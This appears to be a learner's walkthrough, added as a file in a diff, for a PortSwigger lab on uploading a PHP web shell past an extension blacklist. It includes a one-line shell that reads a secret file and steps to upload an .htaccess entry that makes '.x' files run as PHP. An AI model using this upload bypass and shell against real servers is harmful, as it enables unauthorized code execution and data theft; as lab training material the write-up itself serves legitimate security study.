@@ -1,0 +1,17 @@
+lab4:  Web shell upload via extension blacklist bypass
+lab link: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass
+
+
+1. create php file(webShell.php) and write to it the code that get the asked path(/home/carlos/secret)
+	webShell.php: <?php echo file_get_contents('/home/carlos/secret'); ?>
+2.upload webShell.php. message shows: "Sorry, php files are not allowed". this means that the files with php extension is blocked.
+3.go to home page and get any page, then go to proxy>http history>Get files/avatars/webShell.php request. check the response, it refers to apache server. send this request to repeater.
+
+4.the apache server allows to developers to create special configuration files within individual directories in order to override or add to one or more of the global settings by .htaccess file. so now, goal is changing(or adding configuration) in the .htaccess file to can upload file with arbitrary extension to .php. 
+
+5.upload .htaccess file (when we upload it, the existing .htaccess file will be overriden. *case its existing [but if not existing, it will be created]) to do that go to repeater > post my-account/avatar tab . after that change value of filename to .htaccess, content type to text/plain and content of the file(webShell.php) to "addType application/x-httpd-php .x" without double quotations. this means that allow to the files with .x extension to be run as application/x-httpd-php.
+note:application/x-httpd-php is MIME type for php in apache server to read more, check: https://httpd.apache.org/docs/2.2/mod/mod_mime.htm
+
+6. go to go to repeater > post my-account/avatar > send the request with the original configuration but just change its extension to .x(webShell.x)
+7. go to repeater > GET files/avatars/webShell.php tab , change webShell.php to webShell.x, then send the request. 
+8. the secret shows in the response, submit it in the lab banner.
